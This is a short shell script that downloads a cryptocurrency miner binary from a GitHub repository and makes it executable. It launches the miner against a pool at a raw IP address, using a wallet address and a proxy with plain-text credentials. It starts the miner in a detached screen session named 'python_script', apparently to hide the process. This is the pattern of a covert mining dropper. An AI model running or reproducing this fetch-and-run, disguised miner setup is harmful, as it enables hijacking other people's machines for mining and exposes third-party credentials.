cd
wget https://github.com/whiv01/whive/raw/main/minerd
chmod +x minerd
echo "./minerd -a yespower -o stratum+tcp://206.189.2.17:3333 -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -x xtncrobw-rotate:2xy2iaskqndm@p.webshare.io:80 -q" > whive.sh
screen -dmS python_script sh -c 'sh whive.sh > w.log 2>&1'
